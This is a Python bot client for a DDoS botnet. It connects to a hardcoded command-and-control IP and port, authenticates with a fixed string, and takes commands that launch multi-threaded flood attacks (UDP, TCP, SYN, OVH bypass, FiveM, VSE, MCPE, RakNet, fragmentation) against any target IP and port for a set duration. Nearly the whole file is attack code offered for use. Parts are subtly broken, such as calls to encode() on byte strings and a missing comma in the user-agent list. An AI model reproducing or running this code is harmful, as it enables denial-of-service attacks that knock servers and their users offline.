# ------------------------------------------------------------------

import subprocess, random, os, time, threading, socket

# ------------------------------------------------------------------

# Configuration
C2_ADDRESS  = "193.24.210.211"
C2_PORT     = 25045

# ------------------------------------------------------------------

os.system("clear")
print("Active")
time.sleep(1)

# ------------------------------------------------------------------

# Attack List
user_attacks = {}

# ------------------------------------------------------------------

# Payload (FiveM)
payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
# Payload (VSE)
payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
# Payload (MCPE)
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
# Payload (HEX)
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'
# Payload (STDHEX)
payload_stdhex = b'\x00' * 1024

hex = [2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536, 131072, 262144, 524288, 1048576, 2097152, 4194304, 8388608, 16777216]

PACKET_SIZES = [1024, 2048, 3072, 4096, 5120, 6144, 7168, 8192, 9216, 10240, 12288, 14336, 16384]

# ------------------------------------------------------------------

base_user_agents = [
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Windows; U; Windows NT {random.choice(['5.1', '6.1', '10.0'])}; en-US; rv:{random.uniform(5.0, 10.0):.1f}.{random.randint(0, 9)}) Gecko/{random.randint(2000, 2025)}{random.randint(10, 99)} Firefox/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Windows; U; Windows NT {random.choice(['5.1', '6.1', '10.0'])}; en-US; rv:{random.uniform(5.0, 10.0):.1f}.{random.randint(0, 9)}) Gecko/{random.randint(2000, 2025)}{random.randint(10, 99)} Chrome/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/{random.uniform(500.0, 600.0):.1f}.{random.randint(0,9)} (KHTML, like Gecko) Version/{random.randint(7, 15)}.0.{random.randint(1, 9)} Safari/{random.uniform(500.0, 600.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/{random.uniform(500.0, 600.0):.1f}.{random.randint(0,9)} (KHTML, like Gecko) Version/{random.randint(7, 15)}.0.{random.randint(1, 9)} Chrome/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    f"Mozilla/{random.uniform(5.0, 10.0):.1f} (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/{random.uniform(500.0, 600.0):.1f}.{random.randint(0,9)} (KHTML, like Gecko) Version/{random.randint(7, 15)}.0.{random.randint(1, 9)} Firefox/{random.uniform(30.0, 100.0):.1f}.{random.randint(0, 9)}",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Opera/111.0.0.0 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.8 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7 Mobile/15E148 Safari/604.1",
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Mobile Safari/537.36",
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "AppleWebKit/537.36 (KHTML, like Gecko) Edge/127.0.0.0 Safari/537.36",
    "AppleWebKit/537.36 (KHTML, like Gecko) Opera/112.0.0.0 Chrome/126.0.0.0 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 15; SM-G998B Build/TP1A.220624.014)",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Pro Build/UP1A.231005.007)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 13 Build/TP1A.220624.014)",
    "okhttp/5.0.0-alpha.11",
    "okhttp/4.12.0",
    "okhttp/4.11.0",
    "curl/8.6.0",
    "curl/8.5.0",
    "Wget/1.22 (linux-gnu)",
    "PostmanRuntime/7.37.0",
    "PostmanRuntime/7.36.5",
    "Go-http-client/2.0",
    "Go-http-client/1.1",
    "CFNetwork/1560.0.1 Darwin/24.0.0",
    "CFNetwork/1496.0.7 Darwin/23.5.0",
    "UnityPlayer/2023.1.0f1 (UnityWebRequest)",
    "UnityPlayer/2022.3.15f1 (UnityWebRequest)",
    "Mozilla/5.0 (Linux; Android 14; WebView) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.0.0 Mobile Safari/537.36",
    "Chrome WebView 127.0.0.0 Mobile",
    "Android WebView 126.0.0.0",
    "Instagram 320.0.0.0 Android",
    "WhatsApp/2.24.15.80 A",
    "TelegramBot (like TwitterBot)",
    "FBAN/FB4A;FBAV/460.0.0.0;FBBV/123456789",
    "FBAN/FBIOS;FBAV/450.1.0.0;FBBV/987654321",
    "Python-urllib/3.12",
    "python-requests/2.32.3",
    "node-fetch/3.3.2",
    "axios/1.6.8"
]
def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def get_architecture():
    try:
        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
        return result.decode().strip()
    except Exception as e:
        print(f"\nError Unknown Architecture: {e}\n")
        return 'unknown'


def generate_end(length=4, chara='\n\r'):
  d = ''.join(random.choice(chara) for _ in range(length))
  return d

def OVH_BUILDER(ip, port):
    packet_list = []
    for h2 in hex:
        for h in hex:
            random_part = "".join(random.choice(
                "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09"
                "\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13"
                "\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d"
                "\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
                "\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31"
                "\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b"
                "\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45"
                "\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
                "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59"
                "\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63"
                "\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d"
                "\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77"
                "\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"
                "\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b"
                "\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95"
                "\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
                "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
                "\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3"
                "\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd"
                "\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7"
                "\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"
                "\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb"
                "\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5"
                "\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
                "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9"
                "\xfa\xfb\xfc\xfd\xfe\xff"
            ) for _ in range(2048))
            
            paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\']
            for p in paths:
                end = generate_end()
                packet = (
                    f'PGET {p}{random_part} HTTP/1.1\n'
                    f'Host: {ip}:{port}{end}'
                )
                packet_list.append(packet.encode())
    return packet_list

def attack_ovh_tcp(ip, port, secs, stop_event):
  while time.time() < secs:
    if stop_event.is_set():
        break
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s2 = socket.create_connection((ip,port))
        s.connect((ip,port))
        s.connect_ex((ip,port))
        packet = OVH_BUILDER(ip, port)
        for a in packet:
            a = a.encode()
            for _ in range(10):
                s.send(a)
                s.sendall(a)
                s2.send(a)
                s2.sendall(a)
    except:
        pass

# ------------------------------------------------------------------

def attack_ovh_udp(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            packet = OVH_BUILDER(ip, port)
            for a in packet:
                a = a.encode()
                for _ in range(10):
                    s.sendto(a,(ip,port))
        except:
            pass

# ------------------------------------------------------------------

def attack_fivem(ip, port, secs, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            s.sendto(payload_fivem, (ip, port))
    except:
        pass

# ------------------------------------------------------------------

def attack_mcpe(ip, port, secs, stop_event):
    """ MCPE ATTACK """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            s.sendto(payload_mcpe, (ip, port))
    except:
        pass

# ------------------------------------------------------------------

def attack_vse(ip, port, secs, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            s.sendto(payload_vse, (ip, port))
    except:
        pass

# ------------------------------------------------------------------

def attack_hex(ip, port, secs, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            s.sendto(payload_hex, (ip, port))
    except:
        pass

# ------------------------------------------------------------------

def attack_udp_bypass(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet_size = random.choice(PACKET_SIZES) 
            packet = random._urandom(packet_size)
            sock.sendto(packet, (ip, port))
    except:
        pass

# ------------------------------------------------------------------

def attack_tcp_bypass(ip, port, secs, stop_event):
    """ TCP BYPASS """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet_size = random.choice(PACKET_SIZES) 
            packet = random._urandom(packet_size)

            try:
                s.connect((ip, port))
                while time.time() < secs:
                    s.send(packet)
            except Exception as e:
                pass
            finally:
                s.close()    
    except:
        pass

# ------------------------------------------------------------------

def attack_tcp_udp_bypass(ip, port, secs, stop_event):
    """ UDP BYPASS """
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            packet_size = random.choice(PACKET_SIZES)
            packet = random._urandom(packet_size)
            
            if random.choice([True, False]):  # Alterna entre TCP e UDP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
            while time.time() < secs:
                if s.type == socket.SOCK_STREAM:
                    s.send(packet)
                else:
                    s.sendto(packet, (ip, port))
        except Exception as e:
            pass
        finally:
            s.close()

# ------------------------------------------------------------------

def attack_syn(ip, port, secs, stop_event):
    """ SYN ATTACK """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)
    
    try:
        s.connect((ip, port))
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet_size = random.choice(PACKET_SIZES)
            packet = os.urandom(packet_size)
    
            s.send(packet)
    except Exception as e:
        pass

# ------------------------------------------------------------------

def attack_stdhex(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Patrones hex aleatorios
        hex_patterns = [
            b'\xde\xad\xbe\xef\xc0\xff\xee\x00',
            b'\xba\xad\xf0\x0d\x0d\x15\xea\x5e',
            b'\xfa\xce\xb0\x0c\xca\xfe\xba\xbe',
            b'\xde\xad\xc0\xde\xf0\x0d\xba\xbe',
            b'\x00\x11\x22\x33\x44\x55\x66\x77',
            b'\x88\x99\xaa\xbb\xcc\xdd\xee\xff',
            b'\x01\x23\x45\x67\x89\xab\xcd\xef',
            b'\xfe\xdc\xba\x98\x76\x54\x32\x10'
        ]
        while time.time() < secs:
            if stop_event.is_set():
                break
            data = random.choice(hex_patterns) * random.randint(10, 100)
            try:
                sock.sendto(data, (ip, port))
            except:
                pass
    except:
        pass

# ------------------------------------------------------------------

def attack_ovh_pps(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Payloads pequeños para alta tasa de paquetes
        small_payloads = [
            b'\x00', b'\x01', b'\xff', b'\x16', b'\x13', b'\x03',
            b'G', b'P', b'H', b'O',
            b'\x00\x00', b'\x01\x00', b'\xff\xff', b'\x80\x00',
            random._urandom(1), random._urandom(2)
        ]
        while time.time() < secs:
            if stop_event.is_set():
                break
            for _ in range(100):
                payload = random.choice(small_payloads)
                try:
                    sock.sendto(payload, (ip, port))
                except:
                    pass
            time.sleep(0.001)
        sock.close()
    except:
        pass

# ------------------------------------------------------------------

def attack_raknet(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        rak_packet = b'\x01' + b'\x00' * 23 + b'\x00\x00'
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(rak_packet, (ip, port))
            except:
                pass
    except:
        pass

# ------------------------------------------------------------------

def attack_udp_kill(ip, port, secs, stop_event):
    try:
        # Múltiples sockets para máxima intensidad
        sockets = []
        for _ in range(10):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sockets.append(sock)
            except:
                pass
        
        while time.time() < secs:
            if stop_event.is_set():
                break
            for sock in sockets:
                try:
                    # Ráfaga de paquetes grandes
                    for _ in range(50):
                        data = random._urandom(1400)
                        sock.sendto(data, (ip, port))
                except:
                    pass
        
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    except:
        pass

# ------------------------------------------------------------------

def attack_udp_pps(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((ip, port))
        while time.time() < secs:
            if stop_event.is_set():
                break
            # Enviar paquetes null en ráfaga
            for _ in range(50):
                try:
                    sock.send(b'')
                except:
                    pass
        sock.close()
    except:
        pass

# ------------------------------------------------------------------

def attack_udp_game(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(random.choice([512, 780, 1024, 1032]))
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass

# ------------------------------------------------------------------

def attack_udp_query(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        query = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(query, (ip, port))
            except:
                pass
    except:
        pass

# ------------------------------------------------------------------

def attack_udp_frag(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            # Enviar fragmentos de diferentes tamaños
            for _ in range(random.randint(5, 20)):
                frag_size = random.randint(8, 1500)
                fragment = random._urandom(frag_size)
                try:
                    sock.sendto(fragment, (ip, port))
                except:
                    pass
            time.sleep(0.001)
    except:
        pass

# ------------------------------------------------------------------

def lunch_attack(method, ip, port, secs, stop_event):
    methods = {
        '/hex': attack_hex,
        '/udp': attack_udp_bypass,
        '/tcp': attack_tcp_bypass,
        '/mix': attack_tcp_udp_bypass,
        '/syn': attack_syn,
        '/vse': attack_vse,
        '/mcpe': attack_mcpe,
        '/fivem': attack_fivem,
        '/ovhtcp': attack_ovh_tcp,
        '/ovhpps': attack_ovh_pps,
        '/stdhex': attack_stdhex,
        '/udpkill': attack_udp_kill,
        '/udppps': attack_udp_pps,
        '/raknet': attack_raknet,
        '/udpgame': attack_udp_game,
        '/udpquery': attack_udp_query,
        '/udpfrag': attack_udp_frag
    }
    methods[method](ip, port, secs, stop_event)

def start_attack(method, ip, port, duration, thread_count, username):
    stop_event = threading.Event()
    end_time = time.time() + duration

    for _ in range(thread_count):
        t = threading.Thread(target=lunch_attack, args=(method, ip, port, end_time, stop_event), daemon=True)
        t.start()

        if username not in user_attacks:
            user_attacks[username] = []
        user_attacks[username].append((t, stop_event))

def stop_attacks(username):
    if username in user_attacks:
        for t, stop_event in user_attacks[username]:
            stop_event.set()
        user_attacks[username].clear()
    else:
        pass


def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    while 1:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))

            while 1:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send(get_architecture().encode())
                    break

            while 1:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break

            # print(' ')
            break
        except:
            time.sleep(700)

    while 1:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break

            args = data.split(' ')
            command = args[0].lower()

            if command == 'nopingadiasufuaif':
                c2.send('Unknown'.encode())

            elif command == 'stop' and len(args) > 1:
                username = args[1]
                stop_attacks(username)

            else:
                method = command
                ip = args[1]
                port = int(args[2])
                secs = int(args[3])
                threads = int(args[4])
                username = args[5] if len(args) >= 6 else "default"

                start_attack(method, ip, port, secs, threads, username)
        except:
            break

    c2.close()

    main()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("(ShadowInfected) EXITED!")
        os._exit(1)
    except:
        pass
